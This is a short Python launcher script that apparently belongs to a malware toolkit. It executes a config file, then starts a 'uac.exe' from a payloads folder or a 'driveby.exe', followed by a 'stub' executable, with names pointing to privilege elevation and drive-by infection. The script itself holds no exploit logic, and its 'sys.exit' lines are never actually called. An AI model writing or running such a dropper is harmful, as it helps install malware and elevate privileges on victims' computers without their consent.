import os, sys, subprocess
os.chdir("config")
exec(open("config.py").read())

si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
if uac_elevation:
    os.chdir("payloads")
    os.startfile("uac.exe")
    os.chdir("../stub")
    os.startfile(stub)
    sys.exit
else:
    os.startfile("driveby.exe")
    os.chdir("stub")
    os.startfile(stub)
    sys.exit